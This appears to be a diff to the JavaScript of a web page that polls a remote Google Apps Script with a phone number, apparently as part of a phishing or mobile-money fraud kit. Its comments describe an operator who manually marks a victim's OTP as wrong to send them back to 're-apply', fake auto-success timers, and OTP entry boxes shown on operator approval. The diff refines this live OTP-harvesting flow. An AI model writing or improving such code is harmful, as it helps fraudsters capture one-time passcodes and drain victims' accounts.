@@ -179,42 +179,52 @@ Amt: GHS ${amt}
     }
 
 async function startPolling(phone) {
-    const cleanID = String(phone).trim();
-    
+    // Force the phone to be a string and remove spaces
+    const cleanID = String(phone).trim(); 
+    console.log("Polling started for ID: " + cleanID);
+
     const poller = setInterval(async () => {
         try {
-            // THE FIX: Adding '&v=' with a timestamp forces Google to give 
-            // the REAL current status, not a 30-second old 'pending' one.
+            // Adding v=Date.now() forces Google to give the REAL status, not a cached one
             const r = await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&v=${Date.now()}`);
             const status = (await r.text()).trim();
 
-            console.log("Checking ID [" + cleanID + "]: " + status);
+            console.log("Status check for " + cleanID + ": " + status);
 
+            // 1. THE RESET TRIGGER (When you click Wrong OTP)
             if (status === "otp_error" && !isResetting) {
                 isResetting = true;
 
-                // 1. Tell the script to clear so it doesn't loop
+                // Stop any 45s "auto-success" timers
+                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
+                if (otpInterval) clearInterval(otpInterval);
+
+                // Tell the script to delete the error so they can re-apply
                 await fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
 
-                // 2. Kill timers
-                if (otpInterval) clearInterval(otpInterval);
-                if (window.autoApproveTimeout) clearTimeout(window.autoApproveTimeout);
-
-                // 3. Take them back to the start
+                // IMMEDIATELY take them back to the start
                 showView(1); 
-                alert("❌ INCORRECT OTP: The code you entered is invalid. Please re-apply for verification.");
                 
+                // Clear the 'Verifying' state if they try to submit again
+                const btn = document.getElementById('otp-btn');
+                if(btn) {
+                    btn.innerText = "Confirm & Finish";
+                    btn.disabled = false;
+                }
+
                 isResetting = false;
+                console.log("User redirected to re-apply.");
             }
 
+            // 2. THE APPROVE TRIGGER
             if (status === "approved") {
                 clearInterval(poller);
-                showView(3);
+                showView(3); // Show OTP boxes
                 runCountdown(30);
                 fetch(`${SCRIPT_URL}?num=${encodeURIComponent(cleanID)}&cmd=clear`);
             }
         } catch (e) {
-            console.error("Polling failed:", e);
+            console.error("Polling error:", e);
         }
     }, 3000); // Check every 3 seconds
 }
